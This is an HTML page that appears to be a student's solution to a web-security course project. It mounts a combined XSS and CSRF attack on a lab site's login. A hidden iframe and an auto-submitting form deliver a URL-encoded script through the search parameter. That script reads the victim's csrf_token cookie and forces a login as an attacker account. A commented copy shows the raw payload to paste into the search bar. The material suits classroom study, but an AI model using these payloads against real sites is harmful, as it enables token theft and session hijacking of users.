
	<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>

	<iframe style="display:none" name = "hiddenFrame"></iframe> 
	
	<form target="hiddenFrame" name = "test" action="https://eecs388.org/project2/search?q=++%09%3Cscript+src%3D%22http%3A%2F%2Fajax.googleapis.com%2Fajax%2Flibs%2Fjquery%2F2.1.4%2Fjquery.min.js%22%3E%3C%2Fscript%3E++%09%3Ciframe+style%3D%22display%3Anone%22+name+%3D+%22hiddenFrame%22%3E%3C%2Fiframe%3E++%09+%09%3Cform+target%3D%22hiddenFrame%22+name+%3D+%22test%22+action%3D%22https%3A%2F%2Feecs388.org%2Fproject2%2Flogin%3Fcsrfdefense%3D1%26xssdefense%3D0%22+method%3D%22POST%22%3E+++++++++%09%3Cinput+type%3D%22hidden%22+name%3D%22username%22+value%3D%22attacker%22+%2F%3E+++++++++%09%3Cinput+type%3D%22hidden%22+name%3D%22password%22+value%3D%22l33th4x%22+%2F%3E+%09%09%09%3Cinput+type%3D%22hidden%22+name%3D%22csrf_token%22+value%3D%22blah%22+%2F%3E+++++%3C%2Fform%3E++%3Cscript%3E+var+token+%3D+document.cookie.replace%28%2Fcsrf_token%3D%7Cxssdefense%3D0%7Ccsrfdefense%3D1%7C%3B+%7C%2Fgi%2C+%27%27%29%3B+%09+%09%24%28%22input%5Bname%3D%27csrf_token%27%5D%22%29.val%28token%29%3B++%3C%2Fscript%3E++%3Cscript%3E++document.test.submit%28%29%3B+%3C%2Fscript%3E" method="POST">
    </form>

<script> 
document.test.submit(); </script>


<!-- 
code to copy into search bar for xss attack that produces url
	<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>

	<iframe style="display:none" name = "hiddenFrame"></iframe> 
	
	<form target="hiddenFrame" name = "test" action="https://eecs388.org/project2/login?csrfdefense=1&xssdefense=0" method="POST">
        	<input type="hidden" name="username" value="attacker" />
        	<input type="hidden" name="password" value="l33th4x" />
			<input type="hidden" name="csrf_token" value="blah" />
    </form>

<script> var token = document.cookie.replace(/csrf_token=|xssdefense=0|csrfdefense=1|; |/gi, '');
	
	$("input[name='csrf_token']").val(token);

</script>

<script> 
document.test.submit(); </script> -->
